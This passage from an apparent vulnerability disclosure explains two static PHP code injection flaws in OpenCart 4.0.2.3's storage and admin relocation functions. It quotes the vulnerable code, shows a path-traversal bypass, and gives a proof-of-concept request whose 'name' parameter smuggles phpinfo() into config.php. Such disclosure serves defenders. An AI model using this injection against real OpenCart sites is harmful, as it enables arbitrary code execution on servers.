        <span class="nv">$json</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s2">"error_permission"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$json</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// ...</span>
        <span class="c1">// Create the new storage folder</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">))</span> <span class="p">{</span>
            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span> <span class="c1">// [5]</span>
        <span class="p">}</span>
        <span class="c1">// ...</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$start</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$end</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// moving all the files and directories from the old storage folder to the newer one</span>
            <span class="c1">// ...</span>
            
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$end</span> <span class="o">&lt;</span> <span class="nv">$total</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s2">"next"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">url</span><span class="o">-&gt;</span><span class="nb">link</span><span class="p">(</span>
                <span class="s2">"common/security.storage"</span><span class="p">,</span>
                <span class="s2">"&amp;user_token="</span> <span class="mf">.</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">session</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s2">"user_token"</span><span class="p">]</span> <span class="mf">.</span>
                    <span class="s2">"&amp;name="</span> <span class="mf">.</span>
                    <span class="nv">$name</span> <span class="mf">.</span>
                    <span class="s2">"&amp;path="</span> <span class="mf">.</span>
                    <span class="nv">$path</span> <span class="mf">.</span>
                    <span class="s2">"&amp;page="</span> <span class="mf">.</span>
                    <span class="p">(</span><span class="nv">$page</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span>
                <span class="kc">true</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// Start deleting old storage location files and directories.</span>
            <span class="c1">// ...</span>
            <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$base_old</span><span class="p">);</span>
            <span class="c1">// Modify the config files</span>
            <span class="nv">$files</span> <span class="o">=</span> <span class="p">[</span><span class="no">DIR_APPLICATION</span> <span class="mf">.</span> <span class="s2">"config.php"</span><span class="p">,</span> <span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="s2">"config.php"</span><span class="p">,</span> <span class="p">];</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$output</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
                <span class="nv">$lines</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$lines</span> <span class="k">as</span> <span class="nv">$line_id</span> <span class="o">=&gt;</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span> <span class="s1">'define(\'DIR_STORAGE'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$output</span><span class="mf">.</span><span class="o">=</span> <span class="s1">'define(\'DIR_STORAGE\', \''</span> <span class="mf">.</span> <span class="nv">$base_new</span> <span class="mf">.</span> <span class="s1">'\');'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// [6]</span>
                        
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nv">$output</span><span class="mf">.</span><span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$output</span><span class="p">);</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// ...</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>At <code class="language-plaintext highlighter-rouge">[1]</code> and <code class="language-plaintext highlighter-rouge">[2]</code>, the new storage directory’s name and path are obtained from the incoming HTTP GET request and stored into <code class="language-plaintext highlighter-rouge">$name</code> and <code class="language-plaintext highlighter-rouge">$path</code> PHP variables. In both cases, a regex is applied in order to remove special untrusted characters, however, the regex is badly implemented and so does nothing. Furthermore, the <code class="language-plaintext highlighter-rouge">basename()</code> <sup id="fnref:basename"><a href="#fn:basename" class="footnote" rel="footnote" role="doc-noteref">1</a></sup> function is used on the supplied <code class="language-plaintext highlighter-rouge">name</code> parameter, preventing us from using the <code class="language-plaintext highlighter-rouge">/</code> character inside it.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nv">$foo</span> <span class="o">=</span> <span class="s2">"storage99');phpinfo();%23"</span><span class="p">;</span>
<span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'[^a-zA-z0-9_]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$foo</span><span class="p">),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>

<span class="k">print</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span> <span class="c1">// storage99');phpinfo();%23</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">);</span>

<span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-zA-z0-9_]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$foo</span><span class="p">),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>

<span class="k">print</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span> <span class="c1">// storage99phpinfo23</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>
<p>At <code class="language-plaintext highlighter-rouge">[3]</code>, after having verified the authenticated user has the write privilege for <code class="language-plaintext highlighter-rouge">common/security</code>, some checks are performed on <code class="language-plaintext highlighter-rouge">$base_new</code> (which is the concatenation of <code class="language-plaintext highlighter-rouge">$name</code> and <code class="language-plaintext highlighter-rouge">$path</code>). Here the application checks that <code class="language-plaintext highlighter-rouge">$base_new</code> is located inside the OpenCart’s installation folder, but the check is not well performed and (if required) can be bypassed using a path traversal:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="nv">$root</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nb">realpath</span><span class="p">(</span><span class="s1">'$this-&gt;request-&gt;server["DOCUMENT_ROOT"]'</span> <span class="mf">.</span> <span class="s1">'/../'</span><span class="p">));</span>
<span class="k">print</span><span class="p">(</span><span class="nv">$root</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// /home/kali/Projects/OpenCart/4.0.2.3/</span>

<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/dev/shm/new-folder'</span><span class="p">;</span> <span class="c1">// result -&gt; Error!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/home/kali/Projects/new-folder'</span><span class="p">;</span> <span class="c1">// result -&gt; Error!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/dev/shm/new-folder'</span><span class="p">;</span> <span class="c1">// result -&gt; Error!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/home/kali/Projects/OpenCart/new-folder'</span><span class="p">;</span>  <span class="c1">// result -&gt; Error!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/home/kali/Projects/OpenCart/4.0.2.3/new-folder'</span><span class="p">;</span>  <span class="c1">// result -&gt; Accepted!</span>
<span class="nv">$base_new</span> <span class="o">=</span> <span class="s1">'/home/kali/Projects/OpenCart/4.0.2.3/../../../../../../../../dev/shm/new-folder'</span><span class="p">;</span> <span class="c1">// result -&gt; Accepted!</span>

<span class="k">if</span> <span class="p">((</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$root</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$root</span> <span class="o">==</span> <span class="nv">$base_new</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">print</span><span class="p">(</span><span class="s2">"Error!"</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
  <span class="k">print</span><span class="p">(</span><span class="s2">"Accepted!"</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The OpenCart installation directory can be retrieved in many different ways. It can be leaked through the GUI (if the <code class="language-plaintext highlighter-rouge">storage</code> folder has never been moved), or through verbose errors (eg. CVE-2011-3763 <sup id="fnref:3763"><a href="#fn:3763" class="footnote" rel="footnote" role="doc-noteref">2</a></sup>). It can also be read from logs if the user has the <code class="language-plaintext highlighter-rouge">tool/log</code> read privilege, or it can be discovered mis-using other funtionalities such as the change profile image <sup id="fnref:1891"><a href="#fn:1891" class="footnote" rel="footnote" role="doc-noteref">3</a></sup>.</p>

<p class="text-center"><a href="/assets/img/opencart-rce-CVE-2023-47444/path-disclosure.png" class="popup img-link shimmer"><img src="/assets/img/opencart-rce-CVE-2023-47444/path-disclosure.png" alt="path-disclosure" loading="lazy"></a></p>

<p>At <code class="language-plaintext highlighter-rouge">[4]</code>, the application checks that <code class="language-plaintext highlighter-rouge">$base_new</code> does not already exist and <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code> have writable privileges.
If no error has occurred, the application creates the new folder <code class="language-plaintext highlighter-rouge">[5]</code> and moves all the files from the old <code class="language-plaintext highlighter-rouge">storage</code> path to the newer one.<br />
Finally, at <code class="language-plaintext highlighter-rouge">[6]</code>, it replaces inside <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code> the old <code class="language-plaintext highlighter-rouge">DIR_STORAGE</code> value with the newer one, without performing any further checks on the variable.</p>

<p>In a normal scenario, the storage directory will be moved to a newer location under the OpenCart installation folder, and the configuration files will be updated accordingly. However, since there is a lack of input sanitization, it is possible to inject a new storage path inside configuration files containing special characters that allow escaping the <code class="language-plaintext highlighter-rouge">define()</code> function and add arbitrary PHP code.</p>

<p><em>4.0.2.3/upload/admin/config.php</em></p>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1">// Default DIR_STORAGE value</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DIR_STORAGE'</span><span class="p">,</span> <span class="no">DIR_SYSTEM</span> <span class="mf">.</span> <span class="s1">'storage/'</span><span class="p">);</span>

<span class="c1">// DIR_STORAGE after a legitimate move</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DIR_STORAGE'</span><span class="p">,</span> <span class="s1">'/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/'</span><span class="p">);</span>

<span class="c1">// DIR_STORAGE after the exploitation</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DIR_STORAGE'</span><span class="p">,</span> <span class="s1">'/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/'</span><span class="p">);</span><span class="nb">phpinfo</span><span class="p">();</span><span class="c1">#');</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="static-code-injection-in-commonsecurityadmin"><span class="me-2">Static Code Injection in common/security.admin</span><a href="#static-code-injection-in-commonsecurityadmin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<blockquote class="bug">
  <p>The <code class="language-plaintext highlighter-rouge">admin()</code> function in <code class="language-plaintext highlighter-rouge">upload/admin/controller/common/security.php</code> is vulnerable to PHP static code injection because <code class="language-plaintext highlighter-rouge">$name</code> user-controlled variable is placed inside <code class="language-plaintext highlighter-rouge">$base_new</code>, which is then written inside a new <code class="language-plaintext highlighter-rouge">config.php</code> file, without proper escape or validation.</p>
</blockquote>

<p>The relevant vulnerable code can be found below:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="k">function</span> <span class="n">admin</span><span class="p">():</span> <span class="kt">void</span> <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// [1]</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
            <span class="s1">'[^a-zA-z0-9]'</span><span class="p">,</span> 
            <span class="s1">''</span><span class="p">,</span> 
            <span class="nb">basename</span><span class="p">(</span>
                <span class="nb">html_entity_decode</span><span class="p">(</span>
                    <span class="nb">trim</span><span class="p">((</span><span class="n">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> 
                    <span class="no">ENT_QUOTES</span><span class="p">,</span> 
                    <span class="s1">'UTF-8'</span>
                <span class="p">)</span>
            <span class="p">)</span>
        <span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nv">$json</span> <span class="o">=</span> <span class="p">[];</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">hasPermission</span><span class="p">(</span><span class="s1">'modify'</span><span class="p">,</span> <span class="s1">'common/security'</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$base_old</span> <span class="o">=</span> <span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="s1">'admin/'</span><span class="p">;</span> 
        <span class="nv">$base_new</span> <span class="o">=</span> <span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_old</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// [2]</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_admin'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$page</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_admin_exists'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_admin_name'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="no">DIR_OPENCART</span> <span class="mf">.</span> <span class="s1">'config.php'</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="no">DIR_APPLICATION</span> <span class="mf">.</span> <span class="s1">'config.php'</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_writable'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$json</span><span class="p">[</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">language</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'error_permission'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$json</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// ...</span>
        <span class="c1">// 1.  We need to copy the files, as rename cannot be used on any directory, </span>
        <span class="c1">//     the executing script is running under</span>
        <span class="c1">// ...</span>
        <span class="c1">// 2. Create the new admin folder name</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// [3]</span>
            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$base_new</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// 3. split the file copies into chunks.</span>
        <span class="c1">// ...</span>
        <span class="c1">// 4. Copy the files across</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="nv">$start</span><span class="p">,</span> <span class="nv">$end</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// ...</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">((</span><span class="nv">$page</span> <span class="o">*</span> <span class="nv">$limit</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nv">$total</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$json</span><span class="p">[</span><span class="s1">'next'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">url</span><span class="o">-&gt;</span><span class="nb">link</span><span class="p">(</span>
                <span class="s1">'common/security.admin'</span><span class="p">,</span>
                <span class="s1">'&amp;user_token='</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">session</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">'user_token'</span><span class="p">]</span> <span class="mf">.</span> 
                <span class="s1">'&amp;name='</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> 
                <span class="s1">'&amp;page='</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span>
                <span class="kc">true</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// Update the old config files</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$base_new</span> <span class="mf">.</span> <span class="s1">'config.php'</span><span class="p">;</span>
            <span class="nv">$output</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
            <span class="nv">$lines</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>

            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$lines</span> <span class="k">as</span> <span class="nv">$line_id</span> <span class="o">=&gt;</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$status</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

                <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span> <span class="s1">'define(\'HTTP_SERVER'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$output</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'define(\'HTTP_SERVER\', \''</span> <span class="mf">.</span> <span class="c1">// [4]</span>
                    <span class="nb">substr</span><span class="p">(</span> 
                        <span class="no">HTTP_SERVER</span><span class="p">,</span> 
                        <span class="mi">0</span><span class="p">,</span> 
                        <span class="nb">strrpos</span><span class="p">(</span><span class="no">HTTP_SERVER</span><span class="p">,</span> <span class="s1">'/admin/'</span><span class="p">)</span>
                        <span class="p">)</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="s1">'/\');'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> 
                    <span class="nv">$status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span> <span class="s1">'define(\'DIR_APPLICATION'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$output</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'define(\'DIR_APPLICATION\', DIR_OPENCART . \''</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="c1">// [5]</span>
                    <span class="s1">'/\');'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> 
                    <span class="nv">$status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">if</span> <span class="p">(</span><span class="nv">$status</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$output</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="c1">// ...</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// ...</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>At <code class="language-plaintext highlighter-rouge">[1]</code> the new admin directory name is read from the incoming HTTP GET request and stored inside the <code class="language-plaintext highlighter-rouge">$name</code> PHP variable. Also in this case, a regex is applied in order to remove special untrusted characters, but it is badly implemented and so does nothing. As for the <code class="language-plaintext highlighter-rouge">storage()</code> function, also in this case <code class="language-plaintext highlighter-rouge">basename()</code> <sup id="fnref:basename:1"><a href="#fn:basename" class="footnote" rel="footnote" role="doc-noteref">1</a></sup> is used on the supplied <code class="language-plaintext highlighter-rouge">name</code> parameter, preventing us from using the <code class="language-plaintext highlighter-rouge">/</code> character inside it. <br /></p>

<p>At <code class="language-plaintext highlighter-rouge">[2]</code>, after having verified the authenticated user has the write privilege for <code class="language-plaintext highlighter-rouge">common/security</code>, the application checks if the <code class="language-plaintext highlighter-rouge">admin/</code> or the new folder exists and also that <code class="language-plaintext highlighter-rouge">config.php</code> and <code class="language-plaintext highlighter-rouge">admin/config.php</code> have writable privileges. If no error has occurrs, the application creates the new folder <code class="language-plaintext highlighter-rouge">[3]</code> and moves all the files from the old admin path to the newer one.</p>

<p>Finally, at <code class="language-plaintext highlighter-rouge">[4]</code> and <code class="language-plaintext highlighter-rouge">[5]</code>, it replaces inside the new <code class="language-plaintext highlighter-rouge">config.php</code> the old <code class="language-plaintext highlighter-rouge">HTTP_SERVER</code> and <code class="language-plaintext highlighter-rouge">DIR_APPLICATION</code> variables with the new path, without performing any further checks on the variables.</p>

<p>In a normal scenario, the <code class="language-plaintext highlighter-rouge">admin/</code> directory will be moved to a newer directory under the OpenCart installation folder, and the configuration files will be updated accordingly. However, since there is a lack of input sanitization, it is possible to inject two new <code class="language-plaintext highlighter-rouge">HTTP_SERVER</code> and <code class="language-plaintext highlighter-rouge">DIR_APPLICATION</code> paths inside the configuration file containing special characters that allow escaping the <code class="language-plaintext highlighter-rouge">define()</code> function and add arbitrary PHP code.</p>

<h3 id="exploit-conditions-and-prerequisites"><span class="me-2">Exploit Conditions and Prerequisites</span><a href="#exploit-conditions-and-prerequisites" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Both the vulnerabilities can be exploited if the attacker has valid credentials for the backend dashboard with the <code class="language-plaintext highlighter-rouge">write</code> permission on <code class="language-plaintext highlighter-rouge">common/security</code>.
Furthermore, an additional pre-requisite is needed to exploit the <code class="language-plaintext highlighter-rouge">admin()</code> function (<code class="language-plaintext highlighter-rouge">common/security.admin</code>), whereby the <code class="language-plaintext highlighter-rouge">admin/</code> folder must be the default one and must not have been previously renamed.</p>

<h3 id="proof-of-concept"><span class="me-2">Proof-of-Concept</span><a href="#proof-of-concept" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="poc-for-commonsecuritystorage"><span class="me-2">PoC for common/security.storage</span><a href="#poc-for-commonsecuritystorage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>The vulnerability in <code class="language-plaintext highlighter-rouge">common/security.storage</code> can be exploited by sending two GET requests.</p>

<blockquote class="danger">
  <p>The PoC do not fix the mismatch between the <code class="language-plaintext highlighter-rouge">DIR_STORAGE</code> variable written inside <code class="language-plaintext highlighter-rouge">config.php</code> and the actual folder created on disk (<code class="language-plaintext highlighter-rouge">/home/kali/Projects/OpenCart/4.0.2.3/pwned'\'');phpinfo();#</code>). This means that <strong>the PoC completely breaks the application</strong>. Be aware of this.</p>
</blockquote>

<p>The first request has to be sent to: <code class="language-plaintext highlighter-rouge">route=common/security.storage&amp;name=pwned');phpinfo();%23&amp;path=&lt;opencart_base_folder&gt;&amp;user_token=&lt;user_token&gt;</code></p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
